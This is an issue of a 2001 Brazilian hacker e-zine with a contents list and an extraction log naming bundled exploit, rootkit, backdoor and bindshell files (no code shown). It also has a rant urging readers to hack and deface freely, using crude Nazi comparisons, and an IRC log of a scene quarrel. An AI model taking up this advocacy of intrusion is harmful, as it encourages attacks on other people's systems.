Fatal 3rror(0006): drugs overflow!
       ________________________     _______________________________
      /  __________  _______  /    /_____   _____by_Cheat_Struck__/
     /  /__ ___   / /___   / /       ___/  /___   ___   __   ___
    /  ___// o \ / // o \ / /       /__   // o \ / o \ /  \ / o \
   /  /   / _  // // _  // /___  _____/  // _  // _  // O // _  /
  /__/   / //_// // //_//_____/ /_______// / \_\ / \_\\__// / \_\
         )/    )/ )/                     )/    )/         )/
         '     '  '  www.fatal3rror.com  '     '          '
                   www.fatal3rror.cjb.net
                       struck.8m.com


        "Se você rouba idéias de um autor, é plágio. 
         Se voce rouba de muitos autores, é pesquisa."
                                           Wilson Mizner 


          Fatal 3rror_________________06
          Date________________________Outubro/2001
          Founder_____________________Cheat Struck
          Email_______________________cheat@struck.8m.com
          Pages_______________________www.fatal3rror.com
                                      www.fatal3rror.cjb.net
                                      struck.8m.com





        _xXXXP^''                    ``^YXXXx_
     _xXXXXP~        00 - TopicZ         ~YXXXXx_
  _xXXXXXX(                                )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                )XXXXXXP~
     ~YXXXXb_        Cheat  Struck       _dXXXXP~
        ~YXXXbx..                    ..xdXXXP~


 .od[ 00 ]bo.    TopicZ                              / Cheat Struck
 .od[ 01 ]bo.    Introducao                          / Cheat Struck
 .od[ 02 ]bo.    TipZ                                / Cheat Struck
 .od[ 03 ]bo.    ETICA RACKA                         / Cheat Struck
 .od[ 04 ]bo.    DanOS - O que ha por tras           / pcHazard
 .od[ 05 ]bo.    Brasnet Decrypt                     / Marcelo Samsoniuk
 .od[ 06 ]bo.    Protocolos Parte III - ftp          / pcHazard
 .od[ 07 ]bo.    Race Conditions                     / Cheat Struck
 .od[ 08 ]bo.    Backdoors - Episodio II, a ameaca fantasma
                                                     / pcHazard
 .od[ 09 ]bo.    Free Call                           / TPGA
 .od[ 10 ]bo.    Buffer Overwrite                    / Cheat Struck
 .od[ 11 ]bo.    Celulares                           / `pcmcia
 .od[ 12 ]bo.    Phreak Boxes                        / Rastermition
 .od[ 13 ]bo.    Perl Sockets                        / BEHAEL
 .od[ 14 ]bo.    Entrevista - Cheat Struck           / Cheat Struck
 .od[ 15 ]bo.    Sup3r l33t pr0gz                    / Cheat Struck
 .od[ 16 ]bo.    Mailb0x                             / Cheat Struck
 .od[ 17 ]bo.    End of Zine                         / Cheat Struck









        _xXXXP^''                    ``^YXXXx_
     _xXXXXP~       01 - Introducao      ~YXXXXx_
  _xXXXXXX(                                )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                )XXXXXXP~
     ~YXXXXb_        Cheat  Struck       _dXXXXP~
        ~YXXXbx..                    ..xdXXXP~


   Alou!

   Edicao passada as coisas foram meio agitadas... Os logs que eu 
publiquei resultaram em risos para algumas pessoas e raiva para outras.
   A principio iriam ser apenas logs de conversas vazias do pessoal
do #r00t mas acabei mudando de ideia e jogando um balde de agua fria
na galera.
   Eh fato que junto com a fatal3rror, nasceram tambem outras zines
e grupos que publicam textos sobre o assunto. Embora alguns se salvem,
a maioria comecou a publicar as mais bizonhas coisas que tive o 
desgosto de ler.
   Como todos os grupos ativos ate o momento estao preocupados com seus
proprios problemas internos, eu decidi que eu, por nao ter problemas
com grupos (a f3 nao eh nenhum cla hacker), deveria tomar a iniciativa
e chutar o pau da barraca.

   Varias zines mencionadas publicaram textos moldados em cima de
textos da fatal3rror, unsekurity, e alguns textos americanos. Porem
os autores nao tinham conhecimento nenhum do que estavam escrevendo
a nao ser do conteudo do proprio texto rippado.
   Resultado: informacao repetida e incorreta, que acabavam gerando
mais duvidas do que esclarecendo.
   Muitos casos o texto rippado ja era uma rippacao feita de um
anterior e isso gerou um resultado parecido com brincar de telefone
sem-fio.

   Parece que depois da edicao 06 o pessoal tomou vergonha na cara e
muitas zines com conteudo tosco acabaram e as que permaneceram estao
tentando melhorar o nivel das materias.
   Detalhe... os clubes hackers deveriam ser responsaveis pelo que
seus membros escrevem. Portanto se voce tem um clubinho de rackeres
deve tambem assumir as cagadas do que seus socios fazem.

   Para esta edicao eu nao consegui preparar muita coisa pois estou
com outros projetos em andamento. Felizmente uma galera ae decidiu
colaborar e esta edicao ficou com o mesmo peso das anteriores.
   Issu ae!










        _xXXXP^''                    ``^YXXXx_
     _xXXXXP~          02 - TipZ         ~YXXXXx_
  _xXXXXXX(                                )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                )XXXXXXP~
     ~YXXXXb_        Cheat  Struck       _dXXXXP~
        ~YXXXbx..                    ..xdXXXP~



  Autores dessa edicao:
  ---------------------

Cheat Struck        <cheat@struck.8m.com>
pcHazard            <cybercrash@ig.com.br>
Marcelo Samsoniuk   <>
TPGA                <tpga@bol.com.br>
`pcmcia             <dr28@visto.com>
Rastermition        <rastermition@ieg.com.br>
BEHAEL              <behael@mail.com>





  Onde baixar a Fatal 3rror???
  ----------------------------

 * Distribuidores Oficiais:

http://www.fatal3rror.com   
http://www.fatal3rror.cjb.net
http://struck.8m.com/f3

 * Outros:

http://www.txt.org
http://www.onlooker.hpg.com.br
http://4x10m4.vila.bol.com.br
ftp://ftp.netconta.com.br/pub/zines/fatal3rror/






  Extraindo a f3 e seus programas:
  --------------------------------

[root@localhost ~]# tar -zxvf f3-06.tgz
f3/
f3/f3-06.txt
f3/extract.c
f3/danos/danos.pl
[root@localhost ~]# cd f3
[root@localhost f3]# gcc extract.c -o extract
[root@localhost f3]# ./extract f3-06.txt
- Extracting brasnet/brasnet3.c
- Extracting protocolos/ftp/ftpget.pl
- Extracting race/boo.c
- Extracting race/xploit.sh
- Extracting rk/pcdoor.c
- Extracting rk/cleaner.c
- Extracting rk/hider.c
- Extracting var/prog1.c
- Extracting var/prog2.c
- Extracting var/prog3.c
- Extracting var/prog4.c
- Extracting Soquetes/Funcoes.txt
- Extracting Soquetes/basico1.pl
- Extracting Soquetes/basico2.pl
- Extracting Soquetes/basico3.pl
- Extracting Soquetes/basico4.pl
- Extracting Soquetes/server1.pl
- Extracting Soquetes/WebServer.pl
- Extracting Soquetes/bindshell.pl
- Extracting Soquetes/io1.pl
- Extracting Soquetes/io2.pl
- Extracting Soquetes/io3.pl
- Extracting Soquetes/io4.pl
- Extracting Soquetes/ioserver.pl
- Extracting Soquetes/muloscan.pl
- Extracting Superprogs/inverte.c
- Extracting Superprogs/patience.c
- Extracting Superprogs/matrix.c
[root@localhost f3]#









/* 
 *  Para esta edicao nao separei logs mas sim alguns profiles de 
 * conhecidos nossos... Confira:
 */
- Nick: Carti
- Sexo: Hermafrodita
- Tamanho do pe': 45
- Leite: de preferencia branco, desnatado
- Programa predileto: Super Maquinas - Discovery channel
- Mouse: Troni com bolinha encima
- Bebida: Tekila amarelinha
- Banho: Acompanhado de um exemplar do sexo oposto, se possivel 2
- O que faz qdo ta cagando? "Faco uma cara feia, e sons estranhos do tipo
                            Urrgnn"
- O q diz qdo toma um fora? "Eu nem queria mesmo. Vo pra casa homenagea a
                            feiticeira q ganho mais"
- Qual foi a maior loucura q ja fez?
   Aos 14 anos no meu primeiro porre subi num predio de 8 andares em 
construcao, e la no 8 andar bebado eu ficava andando nos berau, e 
olhando pra baixo, mais tarde entrei em coma alcolico apos tomar uma
garrafa de sam remi e meia caxa de cerveja, e meus amigos preocupados
com minha situacao, para nao beber mais, colocaram querozene na cerveja
e eu bebi tudo lambendo os beico. Acabou comigo tomando glicose na veia.
Meus pais nunca descobriram

        _xXXXP^''                    ``^YXXXx_
     _xXXXXP~      03 - ETICA RACKA      ~YXXXXx_
  _xXXXXXX(                                )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                )XXXXXXP~
     ~YXXXXb_        Cheat  Struck       _dXXXXP~
        ~YXXXbx..                    ..xdXXXP~

   Este texto eh inspirado na ridicula demonstracao de etica dos membros
da unsekurity na madrugada de 29/9.

   Pra comecar, o povo desse grupo perdem noites inteiras em discussoes do 
tipo "vamos definir o q eh ser raquer!" ou "vamos discutir se o que ele 
fez eh etico ou nao". Bahh!
   A principio ainda defendo a ideia de que mesmo sendo um grupo, nao eh 
obrigacao de todos os membros seguirem o mesmo codigo etico. Isso eh um 
pensamento nazista. Se eles definirem q matar judeus e negros eh nova 
etica do grupo, logo todos os unsekurity-members vao sair a matar pessoas 
nas ruas.
   Mas a coisa vai mais alem do que isso.
   Eles nao pretendem definir apenas uma etica para o grupo e sim uma 
etica hacker generalisada. Ahh sim... esqueci q foi a unsekurity que 
inventou o termo "hacker" logo eles tem todo o direito de definir o que eh 
ser um hacker. =P
   Eh muito logico ensinar como se faz uma invasao e em seguida dizer que 
se vc fizer isto nao sera um hacker e sim um scriptkid. Entao por que 
diabos ensinam essas coisas?? Os textos deles deveriam ser como os do 
Denerval (ou Derneval, sempre me confundo), do BE, que nao ensinam como 
fazer as coisas pois isso eh considerado anti-etico para ele.
   Mas o pessoal da unsek sabe que ninguem gosta de ler essas coisas que 
soh falam de etica e relatam acontecimentos etc... Todos se interessam em 
aprender como as coisas funcionam para poderem colocar em pratica qdo 
precisarem, nao interessando os motivos de cada um.
   A etica da unsekurity pode ser grosseiramente comparada com dar um 
estilingue para um pirralho mas dizer que ele nao pode atirar.

   Mas eu nao tenho nada a ver com esse grupo. Entao pq estou escrevendo 
sobre eles aki??
   Porque certo dia qdo fui chamado para presenciar uma cena vergonhosa 
para todas as geracoes futuras, onde eles debatiam etica ou sei la o que 
era como se estivessem num tribunal. Tinha ateh juiz que controlava os 
modo +m, +v do knal.
   Ja nao me continha de risada com as falas eticas de nashleon baseadas 
em falas de mitnick e provavelmente influenciadas por algum alucinogeno.
Qdo finalmente tiraram o +m do canal para o resto do pessoal q tava la 
poder opinar. 
   Entao falei meu ponto de vista e aparentemente nao foi mto aceito. O 
coracaodeleao fikou brabo de alguem querer criticar a visao estereotipada 
de etica dele e respondeu: "vai mudar hp q eh a unica coisa q tu sabe 
fazer."
   Como todos que conhecem a unsekurity sabem, qdo o nashleon fala alguma 
coisa issu vira lei. Logo ele diz que eu sou defacer e em seguida vai os 
duendes seguidores dele me banirem sem me dar chances de resposta.
   Entao esta eh minha resposta. Foda-se que agora virou publico isso, 
pois eles nao me deram chance entao eu jogo com as cartas q eu tenho.

   Pra comecar, quem me conhece sabe q eu larguei os dfcs muito antes da 
unsekurity nascer, logo mto antes deles comecarem a pregarem a etica 
unsekurity (ou seria a etica nashleon) q condena os defacements. 
   Mas eu nao deixo que algo besta como "etica hacker" controle a minha 
vida. Se eu quizer voltar a fazer defacements, nao vai ser pq os outros 
acham q isso eh errado que eu nao vou fazer. Eu crio minhas proprias leis 
eticas ao contrario de uns que simplesmente se deixam ser controlados 
pelo unsexurity team.
   Pergunta: Se eles sao tao certinhos assim, por que usam mascaras nakele 
video etico deles?? Do que tem medo se eles sao os kra do bem? Eles devem 
simpatisar com terroristas e se escondem debaixo desta etica tosca. Ou 
estavam com medo de algum conhecido assistir akilo e ficar com vontade de 
espanca-los (como todos os q assistiram).

   Nos meus textos voce nao encontra coisas do tipo: "Se voce eh um 
scriptkiddie entao va se fuder e nao leia isso". Isso pq eu nao me 
considero superior a ninguem que esteje lendo o que escrevi, portanto nao 
posso dizer quem deve e nao deve ler isso. Se os sk nao lerem, nunca vao 
aprender para deixarem de ser kiddies.
   Eu nao falo nos meus textos o que voces devem ou nao fazer para serem 
considerados hackers. Eu simplesmente tento explicar tal assunto e voce 
use do jeito que achar melhor.
   Pra q ser hacker?? Voce vai fazer tudo direitinho como manda o nashleon 
pq se nao nao vai ser considerado hacker. Se nao voce vai ser conhecido 
como lamer, ou sk, ou vibora, etc... Isso sao apenas rotulos que algum 
imbecil inventou para classificar o nivel de conhecimento, mas esta sendo 
usado para classificar o nivel etico das pessoas. Entao se essas palavras 
ja perderam totalmente o sentido pra que dar importancia a elas?
   Hacker ja lhe pareceu coisa seria alguma vez? Provavelmente sim. Mas 
todo o respeito que voce ja teve por esta palavra, esqueca. Por que hoje 
os hackers sao akeles escravos de uma etica ridicula, ou akelas criancas 
que brincam com exploits em perl que rodam em windows.
   O termo hacker nao impoe mais o respeito de qdo nos eramos novatos e 
nao conheciamos direito a comunidade. Agora "ser hacker" eh motivo riso.
O povo sabe que isso eh fato e querem mudar isso impondo regras eticas 
para ser classificado como hacker. 
   Nao sei pq dessa necessidade de querer ser conhecido como hacker. Sera 
que tem gente q nao dorme direito enquanto nao provar para os outros que 
eh um hacker? A um tempo atraz o kra queria provar q era hacker entao 
fazia um deface barato num .org winnt e durmia direito. Mas agora isso eh 
coisa de lamer. Ser hacker agora eh ficar na sua e aprender coisas para 
nao ter que usar.
   Devem achar que eh como karate. Voce aprende a lutar para se defender e 
nao para atacar. Entao se um loko espanca sua mulher, voce espera ate ele 
te atacar para dar uma surra nele. 
   Besteira!
   Se voce sabe lutar, lute! Se sabe hackear, hackeie! Faca o que quizer 
com o conhecimento que voce adquiriu com seu suor. Depois arque com as 
consequencias mas nao deixe que alguem lhe diga o que eh certo e o que eh 
errado. Tenha seu proprio codigo de honra.

   Este eh um dos poucos textos em que tento conscientizar o povo. So
escrevo isso pq muitas pessoas andam se influenciando demais pelo hacker 
etico imposto pela unsekurity.
   Se voce apoia as ideias nazistas e ego-centricas do nashleon eu nao 
tenho nada a ver com a sua vida. Faca o que quizer dela.
   Novamente, soh estou escrevendo isto porque o pessoal da unsek me 
baniram do knal sem me conceder direito de resposta as criticas que 
fizeram nas minhas costas. Mas isto eh etico para eles.
   Nem todos os membros da unsekurity sao troxas, nao preciso dizer a
quais este texto se refere.

   Ae... consegui o log daquele dia. Tirem suas proprias conclusoes...
   Nota: cortei umas partes do log para vc nao ter que ler merda e
encher o saco.


(#behindthescene.Unsecurity)

<module> agora vou abrir
<module> um poco
<coracaodeleao> quero meu direito de resposta..:)
<module> pra o pessoal dar opiniao propria
<module> por favor
<module> nash
<module> vc vai ter
<module> calma kct
<module> tentem nao zonear
<module> please
*** module sets mode: -m
<Emmanuele> mandei minhas opinioes pra list hoje..e acho que chega d
            explicacoes e replicas e treplicas. vamos ao unsek com 
            cara mais transparente e regras novas.
<xf> eh bom diminuir o tempo de +m
*** flash is now known as flash_crakao_do_mal
* snape ugh!
<xf> Emmanuele isso!!
<hts> mais tolerancia.
<Blind_Bard> voces ja leram "os meninos da rua paulo"? =DDD
*** snape is now known as snape_banda_podre
<module> ae, esse snape nao eh um defacer?
<hts> cada lado aumenta e diminui
<hts> quando covem..
<module> oq ele faz aqui?
<hts> e isso nunca acaba
<xf> hahaha :) esses nicks tao ironicos
*** snape_banda_podre is now known as snp\defacer
<Sock> module deve ser
<xf> quem sao eles?
<snp\defacer> module, nao fale muito
*** cezinha is now known as cezinha_kiddie
<snp\defacer> pois ja vi falcatruas suas tb
<snp\defacer> :)
*** snp\defacer is now known as snape_do_mao
<xf> a banda podre veio participar tb
<module> snp\defacer: tu eh um lame meu pobre
*** hak is now known as hak_podre
<flash_crakao_do_mal> eh
*** snape_do_mao was kicked by module (module)
*** module sets mode: +b *!*@200.193.115.UNsecurity-secures-me-3629
<Blood_Sucker> eu acho q estamos aki a 3 horas e ateh agora soh falamu
               de nash e blind
<cezinha_kiddie> ou
<cezinha_kiddie> bane eu tb
<cezinha_kiddie> vai
<cezinha_kiddie> vai tio
<cezinha_kiddie> hehe
<module> ae
<module> ok cezinha_kiddie
<Emmanuele> blind..vc botou sua merda na list e agora vem fazer 
            discurso populista.vai pro pdt que fica melhor. 
<module> infelismente
<lucipher> module: lê o manual do ircd, existe um modo de canal que
           nao deixa mudar de nick :-)
<module> se vcs querem assim
<module> pra mim
<xf> hehehe seria falta de respeito.
<cezinha_kiddie> EH
<module> nao faz diferenca nenhuma
<module> =)
<cezinha_kiddie> HAIL HITTLER!
*** hts sets mode: +b *!*@200.173.116.UNsecurity-secures-me-16
*** cezinha_kiddie was kicked by hts (hts)
<nibble> Blood_Sucker: discordo
<hak_podre> aieuhoaiueh
<Emmanuele> ban mesmo
<hak_podre> uau
<xf> vcs se delongam muito em papo burocratico
<hak_podre> lá vou eu também
<nibble> Blood_Sucker: mais concordo q perdemos muito tempo com isso
<module> hak_podre: se vc quiser..
<coracaodeleao> vcs tao vendo?
<alex_> Emmanuele o muieh.. vai defende seo mitnick 
*** hts sets mode: -bb *!*@200.173.116.UNsecurity-secures-me-16 
    *!*@200.193.115.UNsecurity-secures-me-3629
<coracaodeleao> pq querem esse pessoal na scene?
<Emmanuele> hummm
<Emmanuele> jah defendi
*** snape_do_mao has joined #behindthescene
<coracaodeleao> pessoal q nao tah nem aih?
<xf> ele ta livre
<module> poiseh nash
*** snape_do_mao is now known as snape
<module> nao sei quem quer nao
*** hak_podre is now known as hak
<hak> olha cara
<hak> vou dizer o que eu penso
<Emmanuele> to esperando outro bode expiatorio
<Emmanuele> ta a fim??
<hak> tudo isso acontece por falta de compreensao e tolerancia
<klogd> eu num quero, jah tem que sair tirando essa merda daqui
<alex_> Emmanuele nah... sou ex-programador php
<snape> dialogo eh a melhor solucao
<Emmanuele> alex..vc respeite ou caia fora
<alex_> Emmanuele pq vc traiu o dernerval?
<dum_dum> coracaodeleoa Eu acho q vc nao esta sendo muito Anti-Etico,
          o Blind falou de vc com educaçao e sem te atingir verbalmente
          alias ate te elogiou! Ja vc pelo contrario o hcamou de 
          vibora e o atacou! Nao da pra para com essa CRISE ?? Pq nao
          resolvemos isso como adultos coerentes e voltamos a ficar 
          todos em uma boa ?? :)
<Emmanuele> o q???
<Emmanuele> pirou??
<Emmanuele> derneval eh amigo que se hospeda na minha casa
<Emmanuele> que lama eh esta??
<module> puts
<alex_> sei la
<F22> eu tb acho que o blind e o nash devem ficar nuba boa ....
<alex_> ocuparam meo teclado ake
<Emmanuele> dum dum larga de ser infantil e vai ler a list
<snape> porque os dois nao conversam em pvt
<snape> e pronto
*** module sets mode: +m
<module> realmente
<module> eh complicado
<module> engracado
<module> tem um cara aqui do meu lado
<klogd> fala o q c q module?
<module> e disse "bah, nao sei como vc consegue ! eu faco isso pq eu 
         gosto, to cagando e andando pra esse monte de ente brigando!"
<module> exatamente oq eu nao penso eh isso
<module> realmente
<klogd> eu to do seu lado tombem
<module> seria FACILIMO
*** module sets mode: -o klogd
<module> mto facil
<module> eu ME FUDER
<module> mas nao
<module> eu realmente
<module> pelo menos tento 
<module> fazer algo
<module> pra todos
<module> claro
<module> que nao da pra ser perfeito
<module> ora
<module> quem sou eu
<module> mas eu prefiro ficar aqui
<module> no meio dessa guerra
<module> tentando ajudar de alguma maneira
<module> a ficar na minha
*** module sets mode: -m
*** ChanServ sets mode: +o klogd
*** klogd sets mode: +b *!*@*.250.193.UNsecurity-secures-me-12777
*** alex_ was kicked by klogd (klogd)
<snape> voces conhecem o ditado
*** klogd sets mode: +b *!*@*.177.52.UNsecurity-secures-me-12084
*** flash_crakao_do_mal was kicked by klogd (klogd)
<Emmanuele> nao admito que um cara qualquer venha falar de mim e de
            minha relacao com derneval
<snape> briga de marido e mulher, ninguem mete a colher.
<module> Emmanuele: quem falou?
<Emmanuele> chega de largarem mentiras e merdas no ventilador alheio
<klogd> quem mais vai ficar com graca
<Emmanuele> alex falou
<xf> pessoal, nada de ataques pessoais.
<Emmanuele> alias..quem eh este???
<module> ele saiu ja neh?
<module> poiseh
<module> ataque pessoal
<Emmanuele> ahan
<module> vai ser kill da rede
<Emmanuele> ataques pessoais sao o fim mesmo
<klogd> ** klogd sets ban on *!*@*.250.193.UNsecurity-secures-me-12777
<klogd> *** klogd has kicked alex_ from #behindthescene (klogd)
<klogd> jah se foi :)
<klogd> adoro isso
<module> puta meu
<module> sinceramente
<module> to cansado viu
<coracaodeleao> meu direito de resposta, please.
<Emmanuele> fiquei 4 anos de minha vida dando sangue e meu dinheiro por
            um hacker.nao admito falta de respeito com isto.
<xf> coracaodeleao manda ver
<Emmanuele> fale nash
<module> fala nash
<Emmanuele> to magoada. mas vou ficar ate o fim disto aqui.
<coracaodeleao> sete aih o +m +v
*** hts sets mode: +m
<module> haha, calma emma
*** hts sets mode: +v coracaodeleao
<hts> fale, mas nao fale muito.
<coracaodeleao> Emmanuele tem todo motivo para estar magoada tanto 
                quanto eu...
<coracaodeleao> o unsek sao vcs, e eu chamo o blind de vibora
<coracaodeleao> pq pra mim eh isso q ele representa, jah q quem o 
                conhece ha algum tempo
<coracaodeleao> sabe o quanto ele foi falso, mentiroso e astucioso.
<coracaodeleao> ele sabia da kimera desde janeiro..
<coracaodeleao> mas soh falou sobre ela quando por ironia do destino
<coracaodeleao> eu disse num pvt ao xf q jamais 
<coracaodeleao> participaria de um projeto com ele(ou seja, ele nao 
                iria entrar na kimera).
<coracaodeleao> no q se refere as normas...
<coracaodeleao> vcs querem gente como essas
<coracaodeleao> q ficam brincando e sao elitistas dentro do unsek?
<coracaodeleao> q nao se importam a minima 
<coracaodeleao> q passam anos sem aparecer e quando aparecem, eh pra
                decidir o futuro do unsek?
<coracaodeleao> soh pq o blind as convidou?
<coracaodeleao> nao acho q eh por aih, pessoal..
<coracaodeleao> o unsek sao vcs.. e seu eu digo
<coracaodeleao> q sou diferente, eh pq eu nao quero
<coracaodeleao> amanha ser comparado com viboras, pessoas q prendem 
                hackers eticos
<coracaodeleao> script kiddies q mudam hp ou destroem dados alheios..
<coracaodeleao> eles tem prejudicado a gente(hackers eicos) ha tanto tempo..
<coracaodeleao> pq permiti-los no nosso meio?
<coracaodeleao> sim.. eu sei q temos q concientizar esse pessoal..
<coracaodeleao> mas depois de concientizado eles sao bem vindo a opinar
                dentro do unsek..
<coracaodeleao> mas um cara q muda hp
<coracaodeleao> tem algum moral para defender o hacking?
<coracaodeleao> ou mesmo um elitista tem?
<coracaodeleao> sem lutamos contra a elitizacao, e isso q o blind disse
<coracaodeleao> de q eu sou a figura central... 
<coracaodeleao> quantas vezes eu nao mudei de nick
<coracaodeleao> para evitar estar hj aqui falando isso?
<coracaodeleao> mas ele e outros sempre fizeram
<coracaodeleao> questao de atar meus nicks
<coracaodeleao> como uma corda q chega ao nash leon.
<coracaodeleao> e no q se refere a elitizacao..
<coracaodeleao> tem aqui um monte de testemunhas q viram quando
<coracaodeleao> eu me asfatei no meio do ano passado..
<coracaodeleao> o blind querer q os nicks voltassem para a pagina
<coracaodeleao> e q rolasse sim uma diferenciacao
<coracaodeleao> das pessoas.(q igualdade eh essa?)
<coracaodeleao> eu acho sim q o unsek eh bem maior q nash e blind..
<coracaodeleao> e q a scene nao precisa de nenhum de nos dois..
<coracaodeleao> mas o q eu quero deixar eh q 
<coracaodeleao> se vc abre espaco a banda podre e aos kiddies..
<coracaodeleao> vai ocorrer o q estah correndo hj em maior escala..
<coracaodeleao> "a perda do objetivo original".
<coracaodeleao> sem mais, pessoal.
*** hts sets mode: -m
*** hts sets mode: -v coracaodeleao
<module> olha
<klogd> otimo
<module> acho que agora
<module> isso tem  de terminar
<Emmanuele> faco minhas as palavras de nash
<module> os dois lados
<module> falaram
<module> antes 
<module> eu acho
<module> que soh seria justo
<module>  xf falar
<module> pq ele foi falado
<module> comentaram sobre ele
<module> e ele nao falou nada
<module> e olha
<module> depois dele
<module> o assunto termina
<module> pq temos
<module> que andar com o unsek
<module> nao ficarmos parados
<module> nos probelmas
<xf> +m +v
<module> isso
<module> da +v
*** hts sets mode: +m
*** hts sets mode: +v xf
<xf> vou falar pouco.
<lucipher> eu concordo com as palavras do nash, nao com as ofensas ao
           Blind_Bard.. porque nao sei o que se passou
<xf> <coracaodeleao> ele sabia da kimera desde janeiro..
<xf> <coracaodeleao> mas soh falou sobre ela quando por ironia do 
     destino
<xf> <coracaodeleao> eu disse num pvt ao xf q jamais 
<xf> <coracaodeleao> participaria de um projeto com ele(ou seja, ele
     nao iria entrar na kimera).
<lucipher> ou seja, me mantenho neutro
<xf> primeiro, nao repassei oq vc falou pra mim pra ele
<xf> foi uma acusacao e suspeita injusta
<xf> nao manipulei ninguem para fazer nada
<xf> coracaodeleao eh melhor dar nome aos bois
<xf> e ser claro..
<xf> -v
<module> terminou xf?
*** hts sets mode: -v xf
<module> ok
<module> soh uma coisa
<module> pra terminar
<module> de vez
<module> soh uma coisa
<module> pro blind nao precisar esponder tudo
<module> e continuar com esse loop sem fim
<module> ele soh pediu
<module> pra avisar
<module> que nao convidou nnguem pro canal
<module> hj
<module> ele disse isso pra mim no pvt
<module> e pediu pra eu avisar isso 
<module> agora
<module> vamos voltar ao unsek
<module> que eh o importante pra todos aqui
<hts> isso
<module> tem uns itens interessantes aqui
<module> soh q cada janela
<module> de pvt aqui
<module> tem menos de meio cm
<module> hehe
<module> se alguem tiver algo pra falar p.eqto
<module> pode falar
<module> em qto eu tento achar algo
<module> de util
<module> pra por aqui
<hts> enquanto isso
<module> pra serdiscutido
<module> ...
<hts> enquanto isso..
<hts> vamos voltar a questao que ainda nao foi resolvida ate agora...
<lucipher> posso falar o que eu acho ?
<hts> Temos que decidir a questao do website(o problema de limite de 
      transferencia da virtualave).
<hts> se alguem tem uma sugestao pra esse problema
<hts> me mande no pvt.
<module> ah eh
<module> uma coisa q falaram mto
<module> tava ficando de lado
<module> forum deve voltar.. concordam?
*** hts sets mode: -m
<hts> concordo!
<Emmanuele> para mostrar como funcionam as coisas por aqui..preciso 
            colar uma coisa
<module> concordo
<marcelo> c
<coracaodeleao> concordo, mas nao o q estah!
<module> Emmanuele
<Emmanuele> posso????
<module> concorda ou nao
<module> depois vc fala
<Sock> concordo
<klogd> concordo
<klogd> e bye
<klogd> vou nessa abracos, trampo SUX
<hts> ninguem tem sugestoes ?
<Blood_Sucker> falow klogd
<module> ok foru
<module> espera
<module> tem varias
<module> no pvt
<module> mas eh mta coisa
<module> dexa eu procurar
<xf> agree com o forum
<F22> concordo com o forum
*** klogd has quit IRC (Quit: [x]chat)
<dum_dum> concordo com FORUM
<struck> soh uma coisa... o assunto ja acabou mas... achu q mesmo sendo
         um grupo, vcs nao precisam seguir todos a mesma etica... 6 sao
         nazistas por acaso?
<coracaodeleao> sai fora struck script kiddie.
<struck> ui
<struck> medo
<coracaodeleao> vai mudar hp q eh a unica coisa q tu sabe fazer.
<Blood_Sucker> putz, olha quem ta no canal meu
<F22> ?
<xf> q tristeza
<F22> quem eh struck ?
<AnJiNh0`> onde chegamos
<Blood_Sucker> lucifer, da um jeito nisso meu
<AnJiNh0`> ..
<AnJiNh0`> struck: ...
<snape> deixem ele ae
*** hts sets mode: +m
<module> struck: parece que vc nao viu o comeco da conversa que eh 
         basica pra que possa entender oq acontece
<module> entao please, nao opine
<module> vamos comecar com a aplicar um pouco das regras aqui?
<module> tem certas pessoas que todos sabem que sao completamente fora
         da nossa realidade
<module> da nossa intensao
<module> filosofica
<module> entao essas pessoas
<module> vou ser mais claro
<module> alguns mudadores de sites
<module> e afins
<module> devem ser banidos?
<module> concordam?
*** module sets mode: -m
<hak> nao
<surfer> sim
<F22> sim
<module> concordo
<Blood_Sucker> com certeza sim
<dum_dum> sim!
<Emmanuele> concordo
<hts> sim
<dum_dum> concordo!
<hak> lucipher: o cara, pode chingar meu irmao, mas nao minha mae.
<scuzzy> concordo
<hak> nao concordo
<coracaodeleao> concordo
<coracaodeleao> kiddie = ban!
<module> hak: uma resposa soh
<module> please
<module> ninguem mais opina?
<Blood_Sucker> nao soh os defacers, mas qualquer pessoa q se mostre 
               contra o q pregamos e valorizamos
<marcelo> concordo!
<hak> module: foi mal
<hak> achei que nao tinha pego
*** snape was kicked by module (module)
*** snape has joined #behindthescene
*** module sets mode: +b *!*@200.193.115.UNsecurity-secures-me-3629
*** struck was kicked by module (module)
*** struck has joined #behindthescene
*** module sets mode: +b *!*@200.228.65.UNsecurity-secures-me-3592
<Blind_Bard> discordo... quem vai dizer o q eh certo pra eles?
*** snape was kicked by module (module)
<hak> penso a mesma coisa que o Blind_Bard 
<hak> somos superiores a eles?
<coracaodeleao> q historia eh essa?
*** struck was kicked by module (module)
<hts> abrirao os olhos quando eles quiserem..
<coracaodeleao> negativo..
<xf> leiam a biblia
<Blood_Sucker> estaremos aki
<hak> hts: o que faz voce pensar que esta certo?
<surfer> talvez diferentes
<coracaodeleao> quando abrirem os olhos serao bem vindos.
<hts> hak, o que faz pensar que eles vao mudar ?
<Blood_Sucker> quando eles acordarem serao bem vindos
<hts> eles ja estao no nosso meio faz tempo
<hts> e nao mudaram.
<Blood_Sucker> sim, saun uns aproveitadores
<Blood_Sucker> q soh vem ateh o unsekurity pra conseguir informacao
<dum_dum> Eh verdade!
<coracaodeleao> eh isso q tem q ser coibido!
<coracaodeleao> como?
<coracaodeleao> com essas teias normas aih..
<coracaodeleao> quem for contra, ban!
<dum_dum> Podiamos banir os e-mails desses defacers q sao bem
          conhecidos neh ??
<Blind_Bard> ei...
<F22> sim
<coracaodeleao> um struck desse com infos farah
<hts> maillist privada ?
<Blind_Bard> mas se eles leem um texto
<coracaodeleao> bobagem amanha
<F22> tirar eles da lista ...
<Blind_Bard> de 100 paginas
<coracaodeleao> e nos seremos responsaveis
<Blind_Bard> pra fazer coisas
